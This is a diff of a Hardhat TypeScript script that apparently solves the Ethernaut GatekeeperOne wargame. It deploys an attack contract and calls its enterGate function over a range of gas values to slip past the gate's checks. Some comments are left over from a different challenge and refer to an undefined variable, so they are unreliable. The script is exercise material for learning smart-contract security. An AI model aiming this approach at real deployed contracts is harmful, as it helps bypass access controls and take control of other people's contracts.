@@ -5,9 +5,43 @@ async function attackGateKeeperOne() {
     const _gateAddress = "0x5a2C7Bb67C57AD2b89731D97d0a1bc1D6Cc7c1A0";
     const _gasLowerLimit = 50;
     const _gasUpperLimit = 300;
-    const contractAddress = "0x43C32dB8181f4CD99CC5163a126002A351Ec1F71";
+    const args: any[] = [];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
+
+    // Don't touch below 🚀
+    // Vulnerability comes from the possibility of making a malicious contract the king
+    // Additional read:
+    // site here
+
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "AttackGateKeeperOne", args);
+    // alternative below
+    console.log("Deploying attack contract AttackGateKeeperOne...");
+    const Factory = await ethers.getContractFactory("AttackGateKeeperOne", deployer);
+    const attackGateKeeperOne = await Factory.deploy();
+    console.log(attackGateKeeperOne);
+    console.log(`Contract deployed to ${attackGateKeeperOne.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (attackGateKeeperOne.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: eternalKing.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
     // don't touch below
-    const attack = await ethers.getContractAt("AttackGateKeeperOne", contractAddress);
+    const attack = await ethers.getContractAt("AttackGateKeeperOne", attackGateKeeperOne.address);
     const tx = await attack.enterGate(_gateAddress, _gasLowerLimit, _gasUpperLimit);
     const txReceipt = await tx.wait(1);
     const event1 = await txReceipt.events[0].args.succeeded.toString();
